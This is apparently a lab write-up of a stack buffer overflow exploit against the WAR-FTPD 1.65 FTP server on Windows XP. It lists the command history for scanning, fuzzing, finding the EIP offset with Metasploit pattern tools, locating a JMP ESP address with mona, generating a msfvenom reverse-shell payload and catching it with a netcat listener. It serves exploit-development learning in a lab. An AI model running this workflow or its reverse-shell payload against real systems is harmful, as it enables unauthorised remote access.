# Buffer overflow on FTP Server

## Requirements used

- [WAR-FTPD 1.65 (Vulnerable app)](https://mega.nz/file/TlJ3WKwD#iygtoFbCZMhVKLA6o1llXMz2-PJgohIu8GmInUXd7AI)
- [Immunity Debugger 1.85](https://mega.nz/file/W0oXwQhS#K-AbSqvedRNUsxc99SFpzcyrwpjiSbHurXuDofpGoDw)
- Windows XP SP3

- [Mona](https://github.com/corelan/mona)
- Kali Linux 2021

## History of commands on Bash

```bash
# Scan for open ports without ping and detect version
nmap -v -Pn -sV 192.168.0.11

# Script for test connection to FTP Server
python3 test-service.py

# Fuzzing when SLMail process is attached to Immunity Debugger
python3 fuzzing.py
# -- Access violation with 900 bytes

# Create a pattern for locate EIP register dump
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 900

# Run scsript with pattern
python3 crash-v1.py
# -- Access violation with EIP in 32714131

# Query offset in pattern that reach EIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 32714131
# -- match at offset 485

# Test if EIP is reached
python3 crash-v2.py
# -- Access violation with EIP in 04030201
# -- ESP register was filled with 'C' bytes

# Create a payload of shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.23 LPORT=9000 -b "\x00\x0d\x0a\x20\x40" -f python

# Run netcat and exploit in two terminals
nc -vnlp 9000
python3 exploit.py
```

## History on commands on Immunity Debugger

```bash
# Show infos about modules
!mona modules

# Find instruction JMP ESP (\xff\xe4) on module dll
!mona find -s "\xff\xe4" -m shell32.dll
# -- One of addresses is: 7C9D30D7
```

## References

- [Criando um exploit do zero by Ricardo Longatto](https://youtu.be/H2ZTTQX-ma4)
- [Bad char generator](https://github.com/cytopia/badchars)